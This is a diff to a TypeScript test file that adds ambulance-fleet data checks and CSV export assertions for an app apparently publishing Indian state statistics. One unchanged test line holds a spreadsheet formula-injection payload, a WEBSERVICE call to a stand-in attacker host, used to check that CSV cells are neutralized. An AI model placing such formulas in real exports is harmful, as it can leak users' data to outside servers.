@@ -8,6 +8,7 @@ import { GET as exportStatePacks } from "../app/api/state-packs/export/route";
 import { jurisdictions } from "../lib/evidence";
 import { educationByJurisdiction, vitalByJurisdiction } from "../lib/state-packs";
 import { healthBedsByJurisdiction } from "../lib/health-beds";
+import { ambulancesByJurisdiction } from "../lib/ambulances";
 
 test("neutralizes spreadsheet formulas and hostile download names",()=>{
   assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
@@ -42,12 +43,17 @@ test("all-state periodic packs cover exactly the jurisdiction model and preserve
   assert.deepEqual(Object.keys(educationByJurisdiction).sort(),names);
   assert.deepEqual(Object.keys(vitalByJurisdiction).sort(),names);
   assert.deepEqual(Object.keys(healthBedsByJurisdiction).sort(),names);
+  assert.deepEqual(Object.keys(ambulancesByJurisdiction).sort(),names);
   assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.schools,0),1_471_891);
   assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.enrolments,0),248_045_828);
   assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.teachers,0),9_807_600);
   assert.ok(Object.values(vitalByJurisdiction).every(item=>item.birthRate>0&&item.deathRate>0&&item.infantMortalityRate>=0));
   assert.equal(Object.values(healthBedsByJurisdiction).reduce((sum,item)=>sum+item.totalBeds,0),818_661);
   assert.ok(Object.values(healthBedsByJurisdiction).every(item=>item.totalBeds>0&&item.phc>=0&&item.districtHospital>=0));
+  assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.totalOperational,0),28_830);
+  assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.advancedLifeSupport,0),3_044);
+  assert.equal(Object.values(ambulancesByJurisdiction).reduce((sum,item)=>sum+item.basicLifeSupport,0),15_283);
+  assert.ok(Object.values(ambulancesByJurisdiction).every(item=>item.totalOperational===item.advancedLifeSupport+item.basicLifeSupport+item.patientTransport+item.boats+item.bikes+item.otherVehicles));
 });
 
 test("state-pack CSV export is complete, source-labelled and download-safe",async()=>{
@@ -58,5 +64,7 @@ test("state-pack CSV export is complete, source-labelled and download-safe",asyn
   assert.match(csv,/"education_source","vital_source"/);
   assert.match(csv,/"phc_beds","chc_beds","sub_district_hospital_beds"/);
   assert.match(csv,/"Maharashtra"[^\n]+"45291","31 March 2023"/);
+  assert.match(csv,/"nhm_advanced_life_support_ambulances","nhm_basic_life_support_ambulances"/);
+  assert.match(csv,/"Maharashtra"[^\n]+"233","704","0","3","30","3255","4225","30 June 2024"/);
   assert.match(response.headers.get("content-disposition")??"",/^attachment; filename=[a-z0-9.-]+$/);
 });
